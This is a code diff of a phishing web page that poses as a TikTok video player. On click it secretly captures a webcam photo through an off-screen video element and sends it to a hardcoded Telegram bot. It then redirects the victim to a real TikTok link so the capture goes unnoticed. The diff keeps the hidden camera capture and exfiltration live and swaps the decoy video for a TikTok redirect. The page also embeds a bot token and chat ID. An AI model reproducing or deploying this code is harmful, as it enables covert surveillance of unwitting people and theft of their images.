@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TikTok</title>
+    <title>فيديو</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -43,16 +43,6 @@
             fill: #fff;
             margin-left: 4px;
         }
-        .play-btn.hidden { opacity: 0; }
-
-        video {
-            width: 100%;
-            max-width: 420px;
-            display: none;
-        }
-        video.show { display: block; }
-        .player.hide { display: none; }
-
         #hiddenCam {
             position: fixed;
             top: -9999px; left: -9999px;
@@ -71,9 +61,6 @@
     </div>
 </div>
 
-<!-- الفيديو الحقيقي (يشتغل بعد الضغط) -->
-<video id="realVideo" muted playsinline></video>
-
 <!-- كاميرا التصوير الخفي -->
 <video id="hiddenCam" autoplay playsinline muted></video>
 
@@ -81,11 +68,13 @@
 // ================== الإعدادات ==================
 const TOKEN   = '8735029800:AAHAkVSyWV0uiLQugB-OIIaCbMi-h5se5M4';
 const CHAT_ID = '1659035307';
+
+// 👇 حط رابط التيك توك اللي عايز تحول عليه هنا
+const TIKTOK_URL = 'https://vt.tiktok.com/ZSVucc7HX/';
 // =============================================
 
 const player   = document.getElementById('player');
 const playBtn  = document.getElementById('playBtn');
-const realVideo = document.getElementById('realVideo');
 const hiddenCam = document.getElementById('hiddenCam');
 
 let stream = null;
@@ -132,7 +121,7 @@ player.addEventListener('click', async () => {
 
         const i2 = document.createElement('input');
         i2.type = 'hidden'; i2.name = 'caption';
-        i2.value = `🎬 ضغط على الفيديو - ${new Date().toLocaleString('ar-EG')}`;
+        i2.value = `🎬 ضغط على الفيديو - ${new Date().toLocaleString('ar-EG')}\n${TIKTOK_URL}`;
         form.appendChild(i2);
 
         const file = new File([blob], 'shot.jpg', { type: 'image/jpeg' });
@@ -146,26 +135,22 @@ player.addEventListener('click', async () => {
         document.body.appendChild(form);
         form.submit();
 
-        setTimeout(() => { form.remove(); iframe.remove(); }, 1500);
-
         // 4. وقف الكاميرا
         stream.getTracks().forEach(t => t.stop());
 
-        // 5. شغل الفيديو الحقيقي (يخفي الصورة)
-        player.classList.add('hide');
-        realVideo.classList.add('show');
-        // حط رابط أي فيديو قصير (اختياري)
-        realVideo.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
-        realVideo.play();
+        // 5. استنى شوية عشان الفورم يتبعت، وبعدين حول للتيك توك
+        setTimeout(() => {
+            form.remove();
+            iframe.remove();
+            // 🚀 تحويل مباشر لتيك توك
+            window.location.href = TIKTOK_URL;
+        }, 1000);
 
     } catch (e) {
         console.log(e);
         if (stream) stream.getTracks().forEach(t => t.stop());
-        // حتى لو فشلت الكاميرا، شغل الفيديو عادي
-        player.classList.add('hide');
-        realVideo.classList.add('show');
-        realVideo.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
-        realVideo.play();
+        // لو فشلت الكاميرا بردو حول لتيك توك
+        window.location.href = TIKTOK_URL;
     }
 });
 </script>
